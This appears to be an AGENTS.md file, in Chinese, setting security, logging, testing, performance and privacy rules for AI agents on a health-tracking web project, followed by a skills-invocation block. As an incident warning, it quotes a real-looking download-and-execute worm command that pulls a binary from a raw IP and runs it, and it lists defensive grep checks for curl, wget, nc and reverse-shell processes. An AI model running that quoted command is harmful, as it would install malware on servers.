# AGENTS.md - AI Agent 开发规范

> executor.life 项目 AI Agent 必须遵循的开发规则和安全准则

## 1. 安全规范 🔒

### 1.1 依赖安全

**强制要求：**
- 所有第三方依赖必须使用 **稳定版本**，禁止使用 alpha/beta/rc 版本
- 引入新依赖前必须检查：
  - 在 [Snyk](https://snyk.io/vuln/) 或 [npm audit](https://docs.npmjs.com/cli/v8/commands/npm-audit) 查询已知漏洞
  - 检查 GitHub Issues 中的安全相关问题
  - 查看最近的更新频率（超过 1 年未更新的谨慎使用）
  - 检查依赖的下载量和社区活跃度

**历史安全事件警示：**
```bash
# 2026年1月 Next.js v15.1.3 蠕虫入侵事件
# 攻击命令：
/bin/sh -c cd /tmp;curl -o wlbo http://87.121.84.51/catgirl.x86;wget http://87.121.84.51/catgirl.x86 -O wlbo;chmod 777 wlbo;./wlbo misc.nextjs;rm wlbo

# 受影响版本：next-server (v15.1.3)
# 解决方案：立即升级到安全版本，并重装受感染服务器
```

**版本锁定策略：**
```json
// package.json - 使用精确版本，避免自动升级到有漏洞的版本
{
  "dependencies": {
    "next": "15.1.4",  // 精确版本，不用 ^15.1.4
    "react": "18.3.1"
  }
}
```

```txt
# requirements.txt - Python 同样使用精确版本
fastapi==0.115.0
uvicorn==0.32.0
sqlalchemy==2.0.25
```

### 1.2 代码安全

**禁止行为：**
- ❌ 禁止在代码中硬编码密钥、密码、Token
- ❌ 禁止使用 `eval()`、`exec()` 执行动态代码
- ❌ 禁止直接拼接 SQL 语句（使用 ORM 或参数化查询）
- ❌ 禁止信任用户输入（必须验证和清洗）
- ❌ 禁止在日志中打印敏感信息（密码、Token、个人数据）

**必须行为：**
- ✅ 所有密钥通过环境变量或密钥管理服务获取
- ✅ 用户输入必须经过 Pydantic 模型验证
- ✅ 文件上传必须验证类型、大小、内容
- ✅ API 接口必须有认证和授权检查
- ✅ 敏感操作必须记录审计日志

### 1.3 服务器安全

```bash
# 定期检查可疑进程
ps aux | grep -E "(curl|wget|chmod|/tmp/)" | grep -v grep

# 检查 /tmp 目录异常文件
ls -la /tmp/

# 检查异常网络连接
netstat -tulpn | grep -v 127.0.0.1

# 检查 crontab 是否被篡改
crontab -l
cat /etc/crontab
```

---

## 2. 日志规范 📝

### 2.1 日志级别定义

| 级别 | 用途 | 线上默认 |
|------|------|----------|
| DEBUG | 详细调试信息，变量值、流程追踪 | 关闭 |
| INFO | 正常业务流程，关键操作记录 | 开启 |
| WARNING | 异常但可恢复的情况 | 开启 |
| ERROR | 错误，需要关注但不影响服务 | 开启 |
| CRITICAL | 严重错误，服务可能中断 | 开启 |

### 2.2 日志格式标准

```python
# backend/app/utils/logging_config.py
import logging
import sys
from datetime import datetime

LOG_FORMAT = "%(asctime)s | %(levelname)-8s | %(name)s:%(lineno)d | %(message)s"
LOG_DATE_FORMAT = "%Y-%m-%d %H:%M:%S"

def setup_logging(level: str = "INFO"):
    """
    配置日志系统
    
    Args:
        level: DEBUG/INFO/WARNING/ERROR/CRITICAL
    """
    logging.basicConfig(
        level=getattr(logging, level.upper()),
        format=LOG_FORMAT,
        datefmt=LOG_DATE_FORMAT,
        handlers=[
            logging.StreamHandler(sys.stdout),
            logging.FileHandler(f"logs/app_{datetime.now():%Y%m%d}.log")
        ]
    )
```

### 2.3 业务日志要求

```python
# 功能日志示例
logger.info(f"用户 {user_id} 开始同步 Garmin 数据")
logger.info(f"用户 {user_id} Garmin 同步完成，获取 {record_count} 条记录")

# 性能日志示例
import time

start_time = time.time()
result = await heavy_operation()
duration = time.time() - start_time
logger.info(f"heavy_operation 执行完成，耗时 {duration:.3f}s")

# 错误日志示例（包含上下文）
try:
    result = await api_call()
except Exception as e:
    logger.error(f"API 调用失败 - user_id={user_id}, endpoint={endpoint}, error={str(e)}")
    logger.debug(f"完整异常信息", exc_info=True)  # 仅 DEBUG 级别打印堆栈
```

### 2.4 动态日志级别

```python
# 通过 API 动态调整日志级别
@router.post("/admin/log-level")
async def set_log_level(
    level: str,
    current_user: User = Depends(get_admin_user)
):
    """动态设置日志级别（仅管理员）"""
    import logging
    
    valid_levels = ["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"]
    if level.upper() not in valid_levels:
        raise HTTPException(400, f"无效的日志级别，可选: {valid_levels}")
    
    logging.getLogger().setLevel(getattr(logging, level.upper()))
    logger.info(f"日志级别已调整为 {level.upper()}，操作者: {current_user.email}")
    
    return {"message": f"日志级别已设置为 {level.upper()}"}
```

### 2.5 敏感信息脱敏

```python
def mask_sensitive(data: dict, fields: list) -> dict:
    """脱敏敏感字段"""
    masked = data.copy()
    for field in fields:
        if field in masked:
            value = str(masked[field])
            if len(value) > 4:
                masked[field] = value[:2] + "***" + value[-2:]
            else:
                masked[field] = "***"
    return masked

# 使用示例
logger.info(f"用户登录: {mask_sensitive(user_data, ['password', 'token', 'phone'])}")
```

---

## 3. 测试规范 🧪

### 3.1 测试覆盖要求

| 类型 | 覆盖率要求 | 说明 |
|------|-----------|------|
| 单元测试 | ≥ 80% | 核心业务逻辑 |
| 集成测试 | ≥ 60% | API 端点 |
| E2E 测试 | 关键路径 | 用户主流程 |

### 3.2 测试文件结构

```
tests/
├── unit/                    # 单元测试
│   ├── test_services/       # 服务层测试
│   ├── test_models/         # 模型测试
│   └── test_utils/          # 工具函数测试
├── integration/             # 集成测试
│   ├── test_api/            # API 测试
│   └── test_database/       # 数据库测试
├── e2e/                     # 端到端测试
├── conftest.py              # 测试配置和 fixtures
└── README.md                # 测试说明
```

### 3.3 测试命名规范

```python
# 测试函数命名：test_<功能>_<场景>_<预期结果>
def test_user_login_with_valid_credentials_returns_token():
    """有效凭证登录应返回 token"""
    pass

def test_user_login_with_invalid_password_raises_401():
    """无效密码登录应返回 401"""
    pass

def test_garmin_sync_with_expired_token_triggers_refresh():
    """Token 过期时应自动刷新"""
    pass
```

### 3.4 测试示例

```python
# tests/unit/test_services/test_ai_scheduler.py
import pytest
from datetime import date, time
from unittest.mock import Mock, patch

from app.services.ai_scheduler import AIScheduler, ReminderType


class TestAIScheduler:
    """AI 日程编排引擎测试"""
    
    @pytest.fixture
    def scheduler(self):
        return AIScheduler()
    
    @pytest.fixture
    def mock_db(self):
        return Mock()
    
    def test_get_time_greeting_morning(self, scheduler):
        """测试早间问候语"""
        with patch('app.services.ai_scheduler.get_china_now') as mock_now:
            mock_now.return_value.hour = 7
            greeting = scheduler._get_time_greeting()
            assert "早安" in greeting
    
    def test_get_reminders_filters_by_time(self, scheduler, mock_db):
        """测试提醒按时间过滤"""
        with patch('app.services.ai_scheduler.get_china_now') as mock_now:
            mock_now.return_value.hour = 7
            mock_now.return_value.minute = 5
            
            reminders = scheduler.get_reminders_for_time(mock_db, user_id=1)
            
            # 7:00-7:15 应该有早间洗鼻提醒
            assert any(r['type'] == ReminderType.NASAL_WASH.value for r in reminders)
    
    def test_generate_morning_briefing_includes_sleep_data(self, scheduler, mock_db):
        """测试早间简报包含睡眠数据"""
        # 设置 mock 数据
        mock_db.query.return_value.filter.return_value.first.return_value = Mock(
            sleep_score=85,
            sleep_duration_hours=7.5
        )
        
        briefing = scheduler.generate_morning_briefing(mock_db, user_id=1)
        
        assert 'sections' in briefing
        sleep_section = next(
            (s for s in briefing['sections'] if '睡眠' in s.get('title', '')),
            None
        )
        assert sleep_section is not None


# 运行测试：pytest tests/unit/test_services/test_ai_scheduler.py -v
```

### 3.5 CI/CD 集成

```yaml
# .github/workflows/test.yml
name: Tests

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.12'
      
      - name: Install dependencies
        run: |
          cd backend
          pip install -r requirements.txt
          pip install pytest pytest-cov pytest-asyncio
      
      - name: Run tests with coverage
        run: |
          cd backend
          pytest --cov=app --cov-report=xml --cov-fail-under=80
      
      - name: Upload coverage
        uses: codecov/codecov-action@v4
```

---

## 4. 性能规范 ⚡

### 4.1 响应时间要求

| 操作类型 | 目标响应时间 | 最大响应时间 |
|---------|-------------|-------------|
| 简单查询 | < 100ms | 500ms |
| 复杂查询 | < 500ms | 2s |
| 列表接口 | < 300ms | 1s |
| AI 分析 | < 5s | 30s |
| 文件上传 | < 2s | 10s |

### 4.2 数据库优化

```python
# 必须为常用查询字段建立索引
class GarminData(Base):
    __tablename__ = "garmin_data"
    
    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(Integer, ForeignKey("users.id"), index=True)  # 索引
    record_date = Column(Date, index=True)  # 索引
    
    # 复合索引
    __table_args__ = (
        Index('idx_user_date', 'user_id', 'record_date'),
    )

# 查询优化 - 避免 N+1 问题
# ❌ 错误示例
users = db.query(User).all()
for user in users:
    profile = db.query(UserProfile).filter_by(user_id=user.id).first()  # N 次查询

# ✅ 正确示例
users = db.query(User).options(joinedload(User.profile)).all()  # 1 次查询
```

### 4.3 缓存策略

```python
from functools import lru_cache
from datetime import datetime, timedelta

# 内存缓存（适用于不常变化的数据）
@lru_cache(maxsize=100)
def get_cached_config(key: str) -> str:
    return db.query(Config).filter_by(key=key).first().value

# 带过期时间的缓存
class TTLCache:
    def __init__(self, ttl_seconds: int = 300):
        self._cache = {}
        self._ttl = timedelta(seconds=ttl_seconds)
    
    def get(self, key: str):
        if key in self._cache:
            value, timestamp = self._cache[key]
            if datetime.now() - timestamp < self._ttl:
                return value
            del self._cache[key]
        return None
    
    def set(self, key: str, value):
        self._cache[key] = (value, datetime.now())

# 使用示例
weather_cache = TTLCache(ttl_seconds=1800)  # 30分钟缓存
```

### 4.4 异步处理

```python
# 耗时操作使用异步
import asyncio

async def sync_all_users_garmin_data():
    """批量同步所有用户数据"""
    users = get_sync_enabled_users()
    
    # 并发但限制并发数
    semaphore = asyncio.Semaphore(5)  # 最多同时 5 个
    
    async def sync_with_limit(user):
        async with semaphore:
            await sync_user_data(user)
    
    await asyncio.gather(*[sync_with_limit(u) for u in users])
```

### 4.5 性能监控

```python
import time
from functools import wraps

def performance_log(threshold_ms: float = 1000):
    """性能日志装饰器，超过阈值记录警告"""
    def decorator(func):
        @wraps(func)
        async def wrapper(*args, **kwargs):
            start = time.time()
            result = await func(*args, **kwargs)
            duration_ms = (time.time() - start) * 1000
            
            if duration_ms > threshold_ms:
                logger.warning(
                    f"慢操作警告: {func.__name__} 耗时 {duration_ms:.2f}ms "
                    f"(阈值: {threshold_ms}ms)"
                )
            else:
                logger.debug(f"{func.__name__} 执行耗时 {duration_ms:.2f}ms")
            
            return result
        return wrapper
    return decorator

# 使用示例
@performance_log(threshold_ms=500)
async def get_daily_recommendation(user_id: int):
    ...
```

---

## 5. 数据安全与隐私 🛡️

### 5.1 数据分类

| 级别 | 类型 | 处理要求 |
|------|------|---------|
| L1 - 公开 | 系统配置、静态内容 | 无特殊要求 |
| L2 - 内部 | 聚合统计数据 | 访问控制 |
| L3 - 机密 | 用户健康数据、行为数据 | 加密存储、访问审计 |
| L4 - 绝密 | 密码、Token、密钥 | 加密、不可逆、最小权限 |

### 5.2 用户数据隔离

```python
# 所有用户数据查询必须带 user_id 过滤
# ❌ 错误示例 - 可能泄露其他用户数据
@router.get("/health-data/{record_id}")
async def get_health_data(record_id: int):
    return db.query(HealthData).filter_by(id=record_id).first()

# ✅ 正确示例 - 强制用户隔离
@router.get("/health-data/{record_id}")
async def get_health_data(
    record_id: int,
    current_user: User = Depends(get_current_user_required)
):
    record = db.query(HealthData).filter(
        HealthData.id == record_id,
        HealthData.user_id == current_user.id  # 强制过滤
    ).first()
    
    if not record:
        raise HTTPException(404, "数据不存在")
    
    return record
```

### 5.3 敏感数据加密

```python
from cryptography.fernet import Fernet
import os

# 加密服务
class EncryptionService:
    def __init__(self):
        key = os.getenv("ENCRYPTION_KEY")
        if not key:
            raise ValueError("ENCRYPTION_KEY 环境变量未设置")
        self.cipher = Fernet(key.encode())
    
    def encrypt(self, data: str) -> str:
        return self.cipher.encrypt(data.encode()).decode()
    
    def decrypt(self, encrypted_data: str) -> str:
        return self.cipher.decrypt(encrypted_data.encode()).decode()

# 存储敏感凭证时加密
def save_garmin_credentials(user_id: int, password: str):
    encryption = EncryptionService()
    encrypted_password = encryption.encrypt(password)
    
    credential = GarminCredential(
        user_id=user_id,
        encrypted_password=encrypted_password  # 加密存储
    )
    db.add(credential)
    db.commit()
```

### 5.4 API 安全

```python
# 请求频率限制
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

@router.post("/login")
@limiter.limit("5/minute")  # 每分钟最多 5 次
async def login(request: Request, credentials: LoginRequest):
    ...

# CORS 配置
app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://executor.life", "https://health.executor.life"],
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
    allow_credentials=True,
)

# 请求大小限制
app.add_middleware(
    RequestSizeLimitMiddleware,
    max_size=10 * 1024 * 1024  # 10MB
)
```

### 5.5 审计日志

```python
# 敏感操作必须记录审计日志
class AuditLog(Base):
    __tablename__ = "audit_logs"
    
    id = Column(Integer, primary_key=True)
    user_id = Column(Integer, ForeignKey("users.id"))
    action = Column(String(100))  # login, logout, data_export, admin_action
    resource = Column(String(100))  # 操作的资源
    details = Column(JSON)  # 操作详情
    ip_address = Column(String(50))
    user_agent = Column(String(500))
    created_at = Column(DateTime, default=datetime.utcnow)

def log_audit(
    user_id: int,
    action: str,
    resource: str,
    details: dict,
    request: Request
):
    audit = AuditLog(
        user_id=user_id,
        action=action,
        resource=resource,
        details=details,
        ip_address=request.client.host,
        user_agent=request.headers.get("user-agent", "")[:500]
    )
    db.add(audit)
    db.commit()

# 使用示例
@router.get("/export/health-data")
async def export_health_data(
    request: Request,
    current_user: User = Depends(get_current_user_required)
):
    log_audit(
        user_id=current_user.id,
        action="data_export",
        resource="health_data",
        details={"format": "json", "date_range": "last_30_days"},
        request=request
    )
    ...
```

---

## 6. 代码提交规范 📋

### 6.1 Commit Message 格式

```
<type>(<scope>): <subject>

<body>

<footer>
```

**Type 类型：**
- `feat`: 新功能
- `fix`: 修复 bug
- `docs`: 文档更新
- `style`: 代码格式（不影响功能）
- `refactor`: 重构
- `perf`: 性能优化
- `test`: 测试相关
- `chore`: 构建/工具变更
- `security`: 安全修复

**示例：**
```
feat(ai-scheduler): 添加早间健康简报功能

- 新增 AIScheduler 服务类
- 支持个性化问候语和健康数据摘要
- 集成用户画像和 Garmin 数据

Closes #123
```

### 6.2 代码审查清单

在提交 PR 前检查：

- [ ] 无硬编码的密钥或敏感信息
- [ ] 新依赖已检查安全性
- [ ] 添加了必要的日志
- [ ] 编写了单元测试
- [ ] 用户数据查询有 user_id 过滤
- [ ] 敏感操作有权限检查
- [ ] 代码通过 lint 检查
- [ ] 更新了相关文档

---

## 7. 紧急响应流程 🚨

### 7.1 安全事件处理

```
1. 发现异常 → 2. 隔离受影响系统 → 3. 保留证据 → 4. 分析原因 → 5. 修复并加固 → 6. 复盘总结
```

### 7.2 紧急联系

- 发现安全问题立即上报
- 保留完整的日志和证据
- 不要删除或修改被入侵的文件（先备份）

### 7.3 常用安全检查命令

```bash
# 检查异常进程
ps aux | grep -E "(curl|wget|chmod|nc|bash -i)" | grep -v grep

# 检查异常网络连接
ss -tulpn | grep -v 127.0.0.1
netstat -an | grep ESTABLISHED

# 检查最近修改的文件
find /opt/health-app -mtime -1 -type f

# 检查 crontab
for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2>/dev/null; done

# 检查异常用户
cat /etc/passwd | awk -F: '$3 == 0 {print}'
```

---

## 版本历史

| 版本 | 日期 | 更新内容 |
|------|------|---------|
| 1.0 | 2026-01-17 | 初始版本，包含安全、日志、测试、性能、数据安全规范 |

---

> **记住**: 安全不是可选项，而是必选项。每一行代码都可能是攻击入口。

<skills_system priority="1">

## Available Skills

<!-- SKILLS_TABLE_START -->
<usage>
When users ask you to perform tasks, check if any of the available skills below can help complete the task more effectively. Skills provide specialized capabilities and domain knowledge.

How to use skills:
- Invoke: `npx openskills read <skill-name>` (run in your shell)
  - For multiple: `npx openskills read skill-one,skill-two`
- The skill content will load with detailed instructions on how to complete the task
- Base directory provided in output for resolving bundled resources (references/, scripts/, assets/)

Usage notes:
- Only use skills listed in <available_skills> below
- Do not invoke a skill that is already loaded in your context
- Each skill invocation is stateless
</usage>

<available_skills>

<skill>
<name>brainstorming</name>
<description>"You MUST use this before any creative work - creating features, building components, adding functionality, or modifying behavior. Explores user intent, requirements and design before implementation."</description>
<location>global</location>
</skill>

<skill>
<name>dispatching-parallel-agents</name>
<description>Use when facing 2+ independent tasks that can be worked on without shared state or sequential dependencies</description>
<location>global</location>
</skill>

<skill>
<name>executing-plans</name>
<description>Use when you have a written implementation plan to execute in a separate session with review checkpoints</description>
<location>global</location>
</skill>

<skill>
<name>finishing-a-development-branch</name>
<description>Use when implementation is complete, all tests pass, and you need to decide how to integrate the work - guides completion of development work by presenting structured options for merge, PR, or cleanup</description>
<location>global</location>
</skill>

<skill>
<name>receiving-code-review</name>
<description>Use when receiving code review feedback, before implementing suggestions, especially if feedback seems unclear or technically questionable - requires technical rigor and verification, not performative agreement or blind implementation</description>
<location>global</location>
</skill>

<skill>
<name>requesting-code-review</name>
<description>Use when completing tasks, implementing major features, or before merging to verify work meets requirements</description>
<location>global</location>
</skill>

<skill>
<name>subagent-driven-development</name>
<description>Use when executing implementation plans with independent tasks in the current session</description>
<location>global</location>
</skill>

<skill>
<name>systematic-debugging</name>
<description>Use when encountering any bug, test failure, or unexpected behavior, before proposing fixes</description>
<location>global</location>
</skill>

<skill>
<name>test-driven-development</name>
<description>Use when implementing any feature or bugfix, before writing implementation code</description>
<location>global</location>
</skill>

<skill>
<name>using-git-worktrees</name>
<description>Use when starting feature work that needs isolation from current workspace or before executing implementation plans - creates isolated git worktrees with smart directory selection and safety verification</description>
<location>global</location>
</skill>

<skill>
<name>using-superpowers</name>
<description>Use when starting any conversation - establishes how to find and use skills, requiring Skill tool invocation before ANY response including clarifying questions</description>
<location>global</location>
</skill>

<skill>
<name>verification-before-completion</name>
<description>Use when about to claim work is complete, fixed, or passing, before committing or creating PRs - requires running verification commands and confirming output before making any success claims; evidence before assertions always</description>
<location>global</location>
</skill>

<skill>
<name>writing-plans</name>
<description>Use when you have a spec or requirements for a multi-step task, before touching code</description>
<location>global</location>
</skill>

<skill>
<name>writing-skills</name>
<description>Use when creating new skills, editing existing skills, or verifying skills work before deployment</description>
<location>global</location>
</skill>

</available_skills>
<!-- SKILLS_TABLE_END -->

</skills_system>
